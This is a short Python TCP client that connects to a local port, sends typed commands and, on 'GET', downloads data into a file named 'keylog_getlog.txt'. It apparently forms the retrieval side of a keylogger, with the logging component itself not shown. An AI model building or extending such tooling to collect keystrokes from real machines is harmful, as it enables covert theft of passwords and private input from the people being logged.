import socket

'''
This program must be run as admin for security reasons.
'''

HOST = '127.0.0.1'
PORT = 5001

command = ''
writedata = ''
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

    # allow TCP socket port to be reused indefinitely (otherwise, port is left occupied on program exit)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.connect((HOST, PORT)) # establish handshake with server

    while command != 'TERMINATE':

        command = input('SEND DATA: ')
        s.sendall(command.encode('utf-8'))

        if command == 'GET':
            with open('keylog_getlog.txt','w') as f:
                while True:
                    data = s.recv(1024)
                    writedata += data.decode('utf-8')
                    print("Recieved data chunk")
                    if '[GET_COMPLETE]' in writedata:
                        print('Write complete.')
                        break

                print('Data recieved from server. Writing...')
                f.write(writedata)
